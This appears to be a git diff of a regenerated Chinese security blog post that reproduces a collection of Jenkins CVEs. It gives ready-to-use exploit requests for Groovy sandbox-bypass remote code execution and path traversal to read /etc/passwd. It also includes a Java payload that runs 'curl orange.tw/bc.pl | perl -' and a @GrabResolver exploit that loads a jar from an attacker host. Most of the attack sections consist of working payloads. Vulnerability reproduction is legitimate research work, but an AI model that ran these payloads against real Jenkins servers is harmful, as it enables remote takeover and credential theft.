@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>Jenkins漏洞集合复现 ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -114,7 +124,7 @@
           <div class="post_content">
               <p>复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。</p>
 <h3 id="CVE-2015-8103-反序列化远程代码执行"><a href="#CVE-2015-8103-反序列化远程代码执行" class="headerlink" title="CVE-2015-8103 反序列化远程代码执行"></a>CVE-2015-8103 反序列化远程代码执行</h3><p>1.638之前的Jenkins和1.625.2之前的LTS中的Jenkins CLI子系统，允许远程攻击者通过制作的序列化Java对象执行有问题的commons-collections。</p>
-<p>利用脚本：<a href="https://github.com/LeoHuang2015/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/LeoHuang2015/jenkins-cli-exploit</a></p>
+<p>利用脚本：<a target="_blank" rel="noopener" href="https://github.com/LeoHuang2015/jenkins-cli-exploit">https://github.com/LeoHuang2015/jenkins-cli-exploit</a></p>
 <p>执行后有类似如下反应：</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145130.png" alt="image-20200327115239320"></p>
 <p>还可以使用msf中的模块<code>exploit/linux/misc/jenkins_java_deserialize</code>来执行攻击反弹shell。</p>
@@ -134,78 +144,91 @@
 <h3 id="CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>CVE-2017-1000353 Jenkins-CI 远程代码执行</h3><p>影响版本：Jenkins&lt;=2.56。Jenkins LTS &lt;= 2.46.1</p>
 <p>下载poc<code>https://github.com/vulhub/CVE-2017-1000353</code></p>
 <p>执行生成字节码文件。</p>
-<pre><code>java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  &quot;curl http://xxx.ceye.io&quot;
-</code></pre><p>利用py文件来进行发送</p>
-<pre><code>python exploit.py http://x.x.x.x:8080 jenkins_poc.ser
-</code></pre><p>会有如下反应</p>
+<pre class="line-numbers language-none"><code class="language-none">java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  &quot;curl http:&#x2F;&#x2F;xxx.ceye.io&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>利用py文件来进行发送</p>
+<pre class="line-numbers language-none"><code class="language-none">python exploit.py http:&#x2F;&#x2F;x.x.x.x:8080 jenkins_poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>会有如下反应</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145340.png" alt="image-20200325165630218"></p>
-<h3 id="CVE-2018-1000110-用户枚举"><a href="#CVE-2018-1000110-用户枚举" class="headerlink" title="CVE-2018-1000110 用户枚举"></a>CVE-2018-1000110 用户枚举</h3><pre><code>模糊搜索：http://x.x.x.x:8080/search/?q=a
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145344.png" alt="image-20200325165813965"></p>
-<pre><code>http://x.x.x.x:8080/search/suggest?query=a
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145347.png" alt="image-20200325165911492"></p>
+<h3 id="CVE-2018-1000110-用户枚举"><a href="#CVE-2018-1000110-用户枚举" class="headerlink" title="CVE-2018-1000110 用户枚举"></a>CVE-2018-1000110 用户枚举</h3><pre class="line-numbers language-none"><code class="language-none">模糊搜索：http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;search&#x2F;?q&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145344.png" alt="image-20200325165813965"></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;search&#x2F;suggest?query&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145347.png" alt="image-20200325165911492"></p>
 <p>如果git插件小于3.7，也可以使用如下</p>
-<pre><code>http://x.x.x.x:8080/git/search/?q=a
-http://x.x.x.x:8080/git/search/suggest?query=a
-</code></pre><h3 id="CVE-2018-1000861-远程命令执行"><a href="#CVE-2018-1000861-远程命令执行" class="headerlink" title="CVE-2018-1000861 远程命令执行"></a>CVE-2018-1000861 远程命令执行</h3><p>可以使用如下的一键化脚本</p>
-<pre><code>https://github.com/orangetw/awesome-jenkins-rce-2019
-</code></pre><p>也可以自定义发送请求</p>
-<pre><code>http://x.x.x.x:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute()}}
-</code></pre><p>页面返回空白，响应为</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;git&#x2F;search&#x2F;?q&#x3D;a
+http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;git&#x2F;search&#x2F;suggest?query&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="CVE-2018-1000861-远程命令执行"><a href="#CVE-2018-1000861-远程命令执行" class="headerlink" title="CVE-2018-1000861 远程命令执行"></a>CVE-2018-1000861 远程命令执行</h3><p>可以使用如下的一键化脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;orangetw&#x2F;awesome-jenkins-rce-2019<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以自定义发送请求</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;public class x &#123;public x()&#123;&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;.execute()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>页面返回空白，响应为</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145447.png" alt="image-20200325171107715"></p>
 <p>如果使用脚本，则同样效果</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145454.png" alt="image-20200325171239538"></p>
 <p>还可以使用的POC，使用会提示错误信息，但命令已执行。</p>
-<pre><code>/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;)%7d)%0aclass+Person%7b%7d
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;securityRealm&#x2F;user&#x2F;test&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;)%7d)%0aclass+Person%7b%7d
 
-/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute().text+%7d)%0aclass+Person%7b%7d
-</code></pre><h3 id="CVE-2018-1999002-任意文件读取"><a href="#CVE-2018-1999002-任意文件读取" class="headerlink" title="CVE-2018-1999002 任意文件读取"></a>CVE-2018-1999002 任意文件读取</h3><p>影响版本：Jenkins weekly 2.132 以及更早的版本。Jenkins LTS 2.121.1 以及更早的版本</p>
+&#x2F;securityRealm&#x2F;user&#x2F;test&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;import+groovy.transform.*%0a%40ASTTest(value%3d%7b+&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;.execute().text+%7d)%0aclass+Person%7b%7d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="CVE-2018-1999002-任意文件读取"><a href="#CVE-2018-1999002-任意文件读取" class="headerlink" title="CVE-2018-1999002 任意文件读取"></a>CVE-2018-1999002 任意文件读取</h3><p>影响版本：Jenkins weekly 2.132 以及更早的版本。Jenkins LTS 2.121.1 以及更早的版本</p>
 <p>可以读取Windows系统服务器中的任意文件，且在特定而条件下也可以读取Linux系统服务器中的文件.</p>
 <p>详情：<code>https://xz.aliyun.com/t/2486</code></p>
 <p>结合payload来看，我们请求的url为<code>/plugin/credentials/.ini</code>，则<code>base</code>为空，扩展名（ext变量）即为<code>.ini</code>，然后通过一系列的尝试openURL，在此例中即最后一个情形<code>con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));</code>，会去请求<code>_../../../../../../../../../../../../windows/win.ini</code> ，尽管目录<code>_..</code>并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有<code>_</code>的目录来想办法绕过。</p>
 <p>需要已经开启了匿名用户读取权限，在请求头中添加</p>
-<pre><code>Accept-Language: /../../../../../../../../etc/passwd
-</code></pre><p>处理请求中的包含路径，比如/plugin/xxxx，可以尝试</p>
-<pre><code>/plugin/jquery-detached/.xml
-/plugin/jquery-detached/.key
-/plugin/credentials/.ini
-</code></pre><p>在Windows下这么使用</p>
-<pre><code>GET /plugin/credentials/.ini HTTP/1.1
+<pre class="line-numbers language-none"><code class="language-none">Accept-Language: &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>处理请求中的包含路径，比如/plugin/xxxx，可以尝试</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;plugin&#x2F;jquery-detached&#x2F;.xml
+&#x2F;plugin&#x2F;jquery-detached&#x2F;.key
+&#x2F;plugin&#x2F;credentials&#x2F;.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在Windows下这么使用</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;plugin&#x2F;credentials&#x2F;.ini HTTP&#x2F;1.1
 Host: x.x.x.x:8080
-Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*
 X-Prototype-Version: 1.7
 DNT: 1
 X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
-Origin: http://x.x.x.x:8080
-Referer: http://x.x.x.x:8080/
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.106 Safari&#x2F;537.36
+Origin: http:&#x2F;&#x2F;x.x.x.x:8080
+Referer: http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;
 Accept-Encoding: gzip, deflate
-Accept-Language: /../../../../../../../../etc/passwd
-Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
-Connection: close
-</code></pre><h3 id="CVE-2018-1000600-Jenkins-GitHub-信息泄露"><a href="#CVE-2018-1000600-Jenkins-GitHub-信息泄露" class="headerlink" title="CVE-2018-1000600 Jenkins GitHub 信息泄露"></a>CVE-2018-1000600 Jenkins GitHub 信息泄露</h3><p>影响版本：Jenkins GitHub插件小于1.29.1</p>
+Accept-Language: &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd
+Cookie: JSESSIONID.450017e3&#x3D;x6kdpnkcgllh18wvlaohsqq8z; screenResolution&#x3D;1920x1080; JSESSIONID.ccf0cd96&#x3D;node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177&#x3D;14vcq2nsop6bw1u8urepj65kwv; td_cookie&#x3D;1608956971
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="CVE-2018-1000600-Jenkins-GitHub-信息泄露"><a href="#CVE-2018-1000600-Jenkins-GitHub-信息泄露" class="headerlink" title="CVE-2018-1000600 Jenkins GitHub 信息泄露"></a>CVE-2018-1000600 Jenkins GitHub 信息泄露</h3><p>影响版本：Jenkins GitHub插件小于1.29.1</p>
 <p>利用的POC为，其中user1为用户名。</p>
-<pre><code>/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io
-</code></pre><p>执行后显示</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;securityRealm&#x2F;user&#x2F;user1&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator&#x2F;createTokenByPassword?apiUrl&#x3D;http:&#x2F;&#x2F;xxx.ceye.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行后显示</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145502.png" alt="image-20200326173809956"></p>
 <p>查看DNSlog回显</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145507.png" alt="image-20200326173837239"></p>
 <h3 id="CVE-2019-1003000-远程代码执行"><a href="#CVE-2019-1003000-远程代码执行" class="headerlink" title="CVE-2019-1003000 远程代码执行"></a>CVE-2019-1003000 远程代码执行</h3><p>实际影响版本及编号：<strong>CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</strong></p>
 <p>拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;= 1.3.4。Pipeline: Groovy 插 件 &lt;= 2.61。Script Security 插 件 &lt;= 1.49。</p>
-<p>下载环境和利用代码：<code>https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</code></p>
+<p>下载环境和利用代码：<code> https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</code></p>
 <p>执行利用后显示</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145513.png" alt="image-20200326112837107"></p>
 <p>我们的job中也被添加了如下</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145517.png" alt="image-20200326112903149"></p>
 <h3 id="CVE-2019-1003005-远程代码执行"><a href="#CVE-2019-1003005-远程代码执行" class="headerlink" title="CVE-2019-1003005 远程代码执行"></a>CVE-2019-1003005 远程代码执行</h3><p>受影响版本：</p>
-<pre><code>Jenkins 2.53
+<pre class="line-numbers language-none"><code class="language-none">Jenkins 2.53
 Jenkins 2.122
 Jenkins 2.137
 Jenkins 2.138 启用匿名读取
 Jenkins 2.152 启用匿名读取
 Jenkins 2.153 启用匿名读取
 Script Security Plugin 1.43
-Script Security Plugin 1.48
-</code></pre><p>下载利用脚本：<code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></p>
+Script Security Plugin 1.48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>下载利用脚本：<code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></p>
 <p>构建环境后，执行脚本如下</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145520.png" alt="image-20200326124130037"></p>
 <p>显示如下</p>
@@ -214,35 +237,37 @@ Script Security Plugin 1.48
 <ol>
 <li>创建Payload.java</li>
 </ol>
-<pre><code>public class Payload {
-    public Payload(){
-        try {
-            String payload = &quot;curl orange.tw/bc.pl | perl -&quot;;
-            String[] cmds = {&quot;/bin/bash&quot;, &quot;-c&quot;, payload};
+<pre class="line-numbers language-none"><code class="language-none">public class Payload &#123;
+    public Payload()&#123;
+        try &#123;
+            String payload &#x3D; &quot;curl orange.tw&#x2F;bc.pl | perl -&quot;;
+            String[] cmds &#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, payload&#125;;
             java.lang.Runtime.getRuntime().exec(cmds);
-        } catch (Exception e) { }
+        &#125; catch (Exception e) &#123; &#125;
 
-    }
-}
-</code></pre><ol start="2">
-<li>编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li>
-<li>文件创建后，在某一目录下，文件树类似如下：</li>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li> 编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li>
+<li> 文件创建后，在某一目录下，文件树类似如下：</li>
 </ol>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145524.png" alt="image-20200327093359850"></p>
 <ol start="4">
-<li>编译以上目录<code>jar cvf poc-1.jar code/</code></li>
-<li>将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li>
-<li>将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li>
-<li>利用如下exp</li>
+<li> 编译以上目录<code> jar cvf poc-1.jar code/</code></li>
+<li> 将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li>
+<li> 将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li>
+<li> 利用如下exp</li>
 </ol>
-<pre><code>http://&lt;TARGET HOST&gt;/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
-?value=
-@GrabConfig(disableChecksums=true)%0a
-@GrabResolver(name=&#39;payload&#39;, root=&#39;http://&lt;EXPLOIT HOST&gt;&#39;)%0a
-@Grab(group=&#39;package&#39;, module=&#39;payload&#39;, version=&#39;1&#39;)%0a
-import Payload;
-</code></pre><h3 id="CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>CVE-2019-1003029 Script Security Plugin沙箱绕过</h3><p>此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。</p>
-<h3 id="CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="CVE-2019-10392 Jenkins Git 插件命令执行"></a>CVE-2019-10392 Jenkins Git 插件命令执行</h3><p>之前做过这个漏洞的复现，地址：<a href="https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/" target="_blank" rel="noopener">https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/</a></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;TARGET HOST&gt;&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition&#x2F;checkScriptCompile
+?value&#x3D;
+@GrabConfig(disableChecksums&#x3D;true)%0a
+@GrabResolver(name&#x3D;&#39;payload&#39;, root&#x3D;&#39;http:&#x2F;&#x2F;&lt;EXPLOIT HOST&gt;&#39;)%0a
+@Grab(group&#x3D;&#39;package&#39;, module&#x3D;&#39;payload&#39;, version&#x3D;&#39;1&#39;)%0a
+import Payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>CVE-2019-1003029 Script Security Plugin沙箱绕过</h3><p>此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。</p>
+<h3 id="CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="CVE-2019-10392 Jenkins Git 插件命令执行"></a>CVE-2019-10392 Jenkins Git 插件命令执行</h3><p>之前做过这个漏洞的复现，地址：<a href="https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/">https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/</a></p>
 <h3 id="CVE-2019-10352-任意文件写入"><a href="#CVE-2019-10352-任意文件写入" class="headerlink" title="CVE-2019-10352 任意文件写入"></a>CVE-2019-10352 任意文件写入</h3><p>该漏洞使经过身份验证的具有Job/Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。</p>
 <p>创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME/workspace/test）</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145528.png" alt="image-20200327131927499"></p>
@@ -259,11 +284,11 @@ import Payload;
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2020/03/Jenkins漏洞集合复现/">/2020/03/Jenkins漏洞集合复现/</a>
-                    <p>发表日期：<a href="/2020/03/Jenkins漏洞集合复现/">March 27th 2020, 2:56:40 pm</a>
-                    <p>更新日期：<a href="/2020/03/Jenkins漏洞集合复现/">March 27th 2020, 3:07:18 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">March 27th 2020, 2:56:40 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">March 27th 2020, 3:07:18 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -301,7 +326,7 @@ import Payload;
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2020/03/Jenkins漏洞集合复现/'; 
+            this.page.url = 'https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/'; 
             this.page.identifier = '/2020/03/Jenkins漏洞集合复现/';
         };
         (function() { 
@@ -312,7 +337,7 @@ import Payload;
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -332,16 +357,32 @@ import Payload;
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
